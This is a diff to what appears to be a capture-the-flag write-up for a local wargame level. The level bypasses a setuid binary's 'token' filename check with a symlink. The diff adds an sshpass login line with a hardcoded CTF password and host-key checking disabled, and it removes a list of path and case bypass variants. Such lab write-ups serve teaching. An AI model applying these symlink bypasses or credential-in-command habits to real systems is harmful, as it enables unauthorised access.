@@ -30,6 +30,12 @@ if (strstr(argv[1], "token") != NULL) {
 4. **File Protection**: Token file is readable by setuid binary but protected from users
 5. **Symlink Following**: Opens symlinks without checking their targets
 
+### Connect to level08 via SSH
+Use the token from Level07 as the password:
+```bash
+sshpass -p "fiumuikeil55xe9cu4dood66h" ssh -o StrictHostKeyChecking=no -p 4242 level08@localhost
+```
+
 ### Exploit Steps
 
 #### Step 1: Create Symlink with Uppercase Name
@@ -65,21 +71,6 @@ sshpass -p "quif5eloekouj29ke0vouxean" ssh -o StrictHostKeyChecking=no -p 4242 f
 The token from getflag:
 ```
 Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
-```
-
-### Alternative Bypass Methods
-
-Other case variations that would work:
-
-```bash
-# Using different cases
-/home/user/level08/level08 /tmp/TokEn
-/home/user/level08/level08 /tmp/Token
-/home/user/level08/level08 /tmp/TOKKEN  # typo with case change
-
-# Using different path representations
-/home/user/level08/level08 /tmp/../tmp/TOKEN  # path normalization bypass
-/home/user/level08/level08 /tmp/Token/../TOKEN  # complex path
 ```
 
 ## Security Flaws
